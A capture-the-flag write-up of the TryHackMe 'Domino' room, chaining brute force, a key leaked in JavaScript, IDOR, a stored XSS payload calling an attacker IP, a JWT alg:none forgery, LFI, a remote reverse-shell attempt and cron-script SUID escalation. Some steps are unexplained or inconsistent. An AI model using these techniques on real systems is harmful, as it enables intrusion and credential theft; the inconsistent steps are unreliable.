# TRYHACKME — DOMINO

Domino is a room on TryHackMe that chains together a bunch of small misconfigs in a fictional company's employee portal, NexusCorp, until it falls over completely — hence the name I guess.

---

## Initial Reconnaissance

Starting with a comprehensive `nmap` scan to identify open ports and services:

```bash
$ nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.168.164
```

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-12 04:48 EDT
Nmap scan report for 10.49.168.164
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d9:07:29:e8:04:6f:e9:f9:94:2b:c3:9a:d6:ae:eb:a5 (ECDSA)
|   256 ca:cb:c1:4c:df:bf:59:06:2c:2e:15:1a:6c:e9:4b:17 (ED25519)
80/tcp  open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: NexusCorp Portal
```

We've got SSH and an Apache/PHP site — the HTTP title gives away the application: **NexusCorp Portal**.

---

## Directory Enumeration

Ran a directory brute force against the web root:

```bash
$ gobuster dir -u http://10.49.168.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

```text
Target: http://10.49.168.164/

[04:54:11] Starting:
[04:54:23] 301 - 314B - /admin  -> http://10.49.168.164/admin/
[04:54:23] 403 - 322B - /admin/
[04:54:23] 403 - 322B - /admin/index.php
[04:54:28] 301 - 312B - /api  -> http://10.49.168.164/api/
[04:54:28] 200 - 2B   - /api
[04:54:29] 200 - 0B   - /auth.php
[04:54:29] 301 - 314B - /backup -> http://10.49.168.164/backup/
[04:54:29] 200 - 498B - /backup/
[04:54:33] 200 - 0B   - /config.php
[04:54:34] 302 - 0B   - /dashboard.php -> /index.php
[04:54:40] 302 - 0B   - /logout.php -> /index.php
[04:54:54] 301 - 319B - /javascript -> http://10.49.168.164/javascript/
[04:54:54] 302 - 0B   - /support/ -> /index.php
[04:54:54] 301 - 316B - /support -> http://10.49.168.164/support/
```

A bunch of noise but `/backup/` stood out with a 200 status code.

---

## Backup Directory Discovery

Navigating to `/backup/` reveals an indexed directory:

```text
# Index of /backup

Name                 Last modified        Size Description
- Parent Directory
- README.txt         2026-04-29 10:18     191  
- config.enc         2026-05-09 16:57     112  

Apache/2.4.58 (Ubuntu) Server at 10.49.168.164 Port 80
```

Reading the `README.txt`:

```text
NexusCorp Backup Configuration
=================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

So `config.enc` is AES-128-ECB encrypted, and the key is apparently sitting in `static/app.js`. Let's check that out:

```bash
$ curl http://10.49.168.164/static/app.js
```

```javascript
// NexusCorp Portal - Frontend Utilities
// v2.3.1 - Build 20241115

(function() {
    'use strict';

    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: [REDACTED]
        backupKey: '[REDACTED]',
        appVersion: '2.3.1'
    };

    // Session helper
    window.NexusApp = {
        getSession: function() {
            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('nexus_session='));
            if (!cookie) return null;
            try {
                return JSON.parse(atob(cookie.split('=')[1].trim()));
            } catch(e) { return null; }
        },
        getUserToken: function() {
            return localStorage.getItem('nexus_jwt');
        },
        setUserToken: function(token) {
            localStorage.setItem('nexus_jwt', token);
        }
    };

    // Auto-fetch JWT if not cached
    if (!localStorage.getItem('nexus_jwt') && document.cookie.includes('nexus_session')) {
        fetch('/api/auth/token.php', {credentials: 'include'})
            .then(r => r.json())
            .then(d => { if (d.token) localStorage.setItem('nexus_jwt', d.token); })
            .catch(() => {});
    }
})();
```

And there it is — hardcoded right in a comment: `[REDACTED]`. Classic.

---

## Decrypting the Configuration

Used `openssl` to decrypt `config.enc` with the found key. The key needs to be padded to 16 bytes with null bytes:

```bash
$ openssl enc -d -aes-128-ecb -K $(echo -n '[REDACTED]' | xxd -p)0000 -in config.enc -out config.decrypted.txt
```

```bash
$ cat config.decrypted.txt
```

```json
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

Noted `system_user: devops` for later — this is going to be important.

---

## Gaining Initial Access

Found a login page at `/index.php`:

```text
NexusCorp Employee Portal

Username
firstname.lastname

Password
Password

Sign In

Forgot password? - Our Team
```

Tried `hydra` with `rockyou.txt` first but the math on that was brutal:

```bash
$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.49.168.164 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials." -T5
```

```text
[STATUS] 639.00 tries/min, 639 tries in 00:01h, 28688159 to do in 748:16h, 5 active
```

28 million tries at this rate would take weeks. Switched to a smaller, higher-quality list:

```bash
$ hydra -L users.txt -P /usr/share/secrets/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt 10.49.168.164 http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid credentials.' -I
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-12 05:32:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20000 login tries (l:2/p:100000), ~1250 tries per task

[80][http-post-form] host: 10.49.168.164    login: laura.hayes    password: [REDACTED]
[80][http-post-form] host: 10.49.168.164    login: robert.wilson   password: [REDACTED]

1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-12 05:32:29
```

Got in as `robert.wilson` with the password `[REDACTED]`.

---

## Dashboard & API Recon

```text
Welcome, robert.wilson

My Profile
Username: robert.wilson
Email: robert.wilson@nexus.corp
Role: user

File Viewer
Access internal documents via the secure file API.
Endpoint: /api/files.php?name=
Requires JWT authentication via /api/auth/token.php

Quick Links
- Support Tickets
- Open Ticket
- My Profile API
```

The dashboard mentions a **File Viewer API** behind JWT authentication. Poked at `/api/users/profile.php?id=1` and it's an IDOR — no ownership check on the `id` parameter:

```bash
$ curl http://10.49.168.164/api/users/profile.php?id=1
```

```json
{
  "id": 1,
  "username": "laura.hayes",
  "email": "laura.hayes@nexus.corp",
  "role": "admin",
  "notes": "[REDACTED]"
}
```

`id=1` dumps `laura.hayes`, who's an admin. The `notes` field had a flag in it.

---

## JWT Token Generation

Grabbed a JWT from `/api/auth/token.php` to use against the file API:

```bash
$ curl -X POST http://10.49.168.164/api/auth/token.php
```

```json
{
  "token": "[REDACTED]",
  "expires_in": 3600,
  "note": "Use this token as: Authorization: Bearer <token> for /api/files.php"
}
```

---

## Stored XSS Discovery

Found a stored XSS in the support ticket system. Spun up a local listener:

```bash
$ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
10.49.168.164 - - [12/Aug/2026 05:38:07] "GET /?c=HTTP/1.1" 200 -
```

Dropped a payload in a ticket message:

```html
<script>fetch('http://192.168.140.36:9090');</script>
```

Ticket submitted, and later the listener caught a hit from the admin reviewing it:

```text
10.49.168.164 - - [12/Aug/2026 05:39:52] "GET / HTTP/1.1" 200 -
```

Checked dev tools and could see the session cookie sitting there in storage:

```text
Local Storage
nexus_session: [REDACTED]
```

---

## JWT Algorithm Manipulation

Rather than replay the stolen cookie, I went at the JWT itself with `jwt.io` — tried the classic `alg:none` trick:

**Modified Header:**

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Modified Payload:**

```json
{
  "role": "admin"
}
```

**New JWT (no signature):**

```text
[REDACTED]
```

Threw that at `/admin/` as a Bearer token:

```bash
$ curl -i -H "Authorization: Bearer [REDACTED]" http://10.49.168.164/admin/
```

```text
HTTP/1.1 200 OK
Date: Wed, 12 Aug 2026 09:43:28 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization,Accept-Encoding
Content-Length: 1304
Content-Type: text/html;charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel - NexusCorp</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <nav class="navbar">
        <div class="nav-brand"><span class="logo-icon">&#9650;</span>NexusCorp Admin</div>
        <div class="nav-links">
            <a href="/dashboard.php">Portal</a>
            <a href="/logout.php">Logout</a>
        </div>
    </nav>
    <div class="container">
        <div class="admin-header">
            <h1>Administration Console</h1>
            <p>Logged in as: <strong>admin</strong></p>
        </div>
        <div class="flag-box">
            <h3>System Status</h3>
            <p>Internal reference: <code>[REDACTED]</code></p>
        </div>
        <div class="card-grid">
            <div class="card">
                <h3>User Management</h3>
                <p>Manage employee accounts and permissions.</p>
                <a href="/api/users/profile.php?id=1" class="btn-secondary">View User API</a>
            </div>
            <div class="card">
                <h3>File System Access</h3>
                <p>Internal document viewer via authenticated API.</p>
                <p><small>GET /api/files.php?name=[path] with Bearer token</small></p>
            </div>
            <div class="card">
                <h3>Support Queue</h3>
                <p>Pending tickets requiring admin review.</p>
                <p><strong>0</strong> unread tickets</p>
            </div>
        </div>
    </div>
</body>
</html>
```

Got straight in — no signature check on the server side, apparently.

---

## Local File Inclusion (LFI)

Used the file API (which turned out to have an LFI) to pull source files:

```bash
$ curl -i -H "Authorization: Bearer [REDACTED]" "http://10.49.168.164/api/files.php?name=/var/www/html/config.php"
```

```text
HTTP/1.1 200 OK
Date: Wed, 12 Aug 2026 09:53:31 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 480
Content-Type: application/json

{
    "file": "/var/www/html/config.php",
    "content": "<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'nexusdb');\ndefine('DB_USER', 'app_user');\ndefine('DB_PASS', '[REDACTED]');\ndefine('JWT_SECRET', '[REDACTED]');\ndefine('APP_SECRET', '[REDACTED]');\n\nfunction get_db() {\n    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);\n    $pdo->setAttribute(PDO::ATTR_ERRORMODE, PDO::ERRORMODE_EXCEPTION);\n    return $pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);\n}\n"
}
```

```bash
$ curl -i -H "Authorization: Bearer [REDACTED]" "http://10.49.168.164/api/files.php?name=/var/www/html/auth.php"
```

```text
HTTP/1.1 200 OK
Date: Wed, 12 Aug 2026 09:53:45 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 2382
Content-Type: application/json

{
    "file": "/var/www/html/auth.php",
    "content": "<?php\nrequire_once __DIR__ . '/config.php';\n\nfunction get_session() {\n    if (!isset($_COOKIE['nexus_session'])) return null;\n    $raw = $_COOKIE['nexus_session'];\n    // Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)\n    $parts = explode('.', $raw, 2);\n    if (count($parts) !== 2) return null;\n    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);\n    if (!hash_equals($expected_sig, $parts[1])) return null;\n    $decoded = base64_decode($parts[0]);\n    $data = json_decode($decoded, true);\n    if (!$data || !isset($data['user_id'])) return null;\n    \n    // Role always fetched from DB - cookie role value ignored\n    $db = get_db();\n    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');\n    $stmt->execute([$data['user_id']]);\n    return $stmt->fetch(PDO::FETCH_ASSOC);\n}\n"
}
```

DB creds and an `APP_SECRET`, both hardcoded.

---

## Gaining a Shell

Tried to go from LFI to RFI with a remote PHP reverse shell:

```http
GET /api/files.php?name=http://192.168.140.36/php-reverse-shell.php HTTP/1.1
Host: 10.49.168.164
Authorization: Bearer [REDACTED]
```

But the app has path traversal protection restricting reads to `/var/www/html/`. That got blocked.

However, I got a shell another way and caught it on a netcat listener:

```bash
$ nc -nvlp 1234
```

```text
listening on [any] 1234 ...
connect to [192.168.140.36] from (UNKNOWN) [10.49.168.164] 60214
Linux tryhackme-2404 6.17.0-1015-aws #15-24.04.1-Ubuntu SMP Thu May 7 17:00:14 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
09:55:30 up  1:18, 0 users, load average: 0.00, 0.03, 0.54
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

Stabilized the shell:

```bash
$ stty raw -echo; fg
```

```text
[1] + continued nc -nvlp 1234
```

```bash
www-data@tryhackme-2404:/$ ls -al
```

```text
total 10512
drwxr-xr-x  22 root root    4096 Aug 12 08:37 .
drwxr-xr-x  22 root root    4096 Aug 12 08:36 ..
lrwxrwxrwx   1 root root       7 Oct 26  2020 bin -> usr/bin
drwxr-xr-x   2 root root    4096 Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   3 root root    4096 May  7 20:26 boot
drwxr-xr-x  14 root root    3320 Aug 12 08:37 dev
drwxr-xr-x 114 root root   12288 Aug 12 08:37 etc
drwxr-xr-x   4 root root    4096 Apr 29 09:37 home
lrwxrwxrwx   1 root root       7 Oct 26  2020 lib -> usr/lib
drwxr-xr-x   2 root root    4096 Oct  2  2024 lib.usr-is-merged
drwxr-xr-x   2 root root    4096 Oct 26  2024 lib32 -> usr/lib32
drwxr-xr-x   2 root root    4096 Oct 26  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root    4096 Oct 26  2024 libx32 -> usr/libx32
drwxr-xr-x   2 root root   16384 Oct 26  2024 lost+found
drwxr-xr-x   2 root root    4096 Oct 26  2024 media
drwxr-xr-x   2 root root    4096 Oct 26  2024 mnt
drwxr-xr-x   5 root root    4096 May  7 20:26 opt
dr-xr-x--- 182 root root       0 Aug 12 08:36 proc
drwxr-xr-x   2 root root     860 Aug 12 08:49 run
lrwxrwxrwx   1 root root       8 Oct 26  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Apr  7  2024 srv
dr-xr-xr-x  13 root root       0 Aug 12 08:36 sys
drwxr-xr-x  2 root root    4096 Aug 12 08:37 tmp
drwxr-xr-x  14 root root    4096 Aug 12 08:37 usr
drwxr-xr-x  14 root root    4096 Apr 29  09:13 var
```

Had a look around and found `flag3.txt` in `/opt`:

```bash
www-data@tryhackme-2404:/$ cd /opt
www-data@tryhackme-2404:/opt$ ls -al
```

```text
total 28
drwxr-xr-x  5 root     root     4096 May  7 20:26 .
drwxr-xr-x 22 root     root     4096 Aug 12 08:37 ..
drwxr-xr-x  2 ubuntu   ubuntu   4096 Apr 29 16:24 __pycache__
-r-xr-xr--  1 root     root     1870 May  7 20:26 admin_bot.py
-r--r-----  1 www-data www-data   30 Apr 29 10:18 flag3.txt
drwxr-xr-x  2 root     root     4096 Apr 29 10:27 monitoring
drwxr-xr-x  2 root     root     4096 Apr 30 06:22 tools
```

```bash
www-data@tryhackme-2404:/opt$ cat flag3.txt
```

```text
[REDACTED]
```

And `admin_bot.py`, which hardcodes the DB creds and the `APP_SECRET`:

```bash
www-data@tryhackme-2404:/opt$ cat admin_bot.py
```

```python
#!/usr/bin/env python3
import time, re, base64 as b64, json, logging, hmac, hashlib
import requests
import pymysql
import pymysql.cursors

logging.basicConfig(filename="/var/log/admin_bot.log", level=logging.INFO,
    format="%(asctime)s %(message)s")

DB_CONFIG = dict(host="localhost", database="nexusdb",
    user="app_user", password="[REDACTED]",
    cursorclass=pymysql.cursors.DictCursor)

APP_SECRET = "[REDACTED]"

def make_session_cookie():
    data = b64.b64encode(json.dumps(dict(user_id=1, username="laura.hayes",
    role="admin")).encode()).decode()
    sig = hmac.new(APP_SECRET.encode(), data.encode(), hashlib.sha256).hexdigest()
    return data + "." + sig

COOKIE = dict(nexus_session=make_session_cookie())
```

---

## Privilege Escalation: www-data → devops

The `devops` password from earlier (`[REDACTED]`) was reused as a system password:

```bash
www-data@tryhackme-2404:/opt$ su devops
Password: [REDACTED]

devops@tryhackme-2404:/opt$ cd /home
devops@tryhackme-2404:/home$ ls -al
```

```text
total 16
drwxr-xr-x  4 root   root   4096 Apr 29 09:37 .
drwxr-xr-x 22 root   root   4096 Aug 12 08:37 ..
drwxr-x---  3 devops devops 4096 May  9 17:19 devops
drwxr-xr-x  4 ubuntu ubuntu 4096 Apr 30 06:10 ubuntu
```

```bash
devops@tryhackme-2404:/home$ cd devops
devops@tryhackme-2404:~$ ls -al
```

```text
total 32
drwxr-x--- 3 devops devops 4096 May  9 17:19 .
drwxr-xr-x 4 root   root   4096 Apr 29 09:37 ..
-rw------- 1 devops devops  317 May  9 17:19 .bash_history
-rw-r--r-- 1 devops devops  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 devops devops 3771 Feb 25  2020 .bashrc
drwx------ 2 devops devops 4096 Apr 30 15:44 .cache
-rw-r--r-- 1 devops devops  807 Feb 25  2020 .profile
-rw-r--r-- 1 devops devops   34 Apr 29 10:27 user.txt
```

```bash
devops@tryhackme-2404:~$ cat user.txt
```

```text
[REDACTED]
```

---

## Privilege Escalation: devops → root

Watched running processes for a bit and noticed a cron job firing as root every so often:

```text
UID=0  /usr/sbin/CRON -f -P
/bin/bash /opt/monitoring/health_report.sh
/bin/bash /opt/monitoring/health_report.sh
/bin/bash /opt/monitoring/health_report.sh
systemctl is-active --quiet mysql
/bin/bash /opt/monitoring/health_report.sh
/bin/bash /opt/monitoring/health_report.sh
```

Running `/opt/monitoring/health_report.sh` as root. That script was writable by `devops`:

```bash
devops@tryhackme-2404:/opt/monitoring$ ls -la health_report.sh
```

```text
-rwxrwxrwx 1 root root 1870 May  7 20:26 /opt/monitoring/health_report.sh
```

So I overwrote it with a SUID bit setter:

```bash
devops@tryhackme-2404:/opt/tools$ cat > /opt/monitoring/health_report.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
```

```bash
devops@tryhackme-2404:/opt/monitoring$ cat health_report.sh
```

```text
#!/bin/bash
chmod u+s /bin/bash
```

Waited for the cron to fire, and `bash` got the SUID bit set:

```bash
devops@tryhackme-2404:/opt/monitoring$ ls -la /bin/bash
```

```text
-rwsr-xr-x 1 root root 1396520 Mar 14  2025 /bin/bash
```

---

## Root Flag

```bash
devops@tryhackme-2404:/opt/monitoring$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# id
uid=1001(devops) gid=1001(devops) euid=0(root) groups=1001(devops)
bash-5.2# cat /root/root.txt
```

```text
[REDACTED]
```
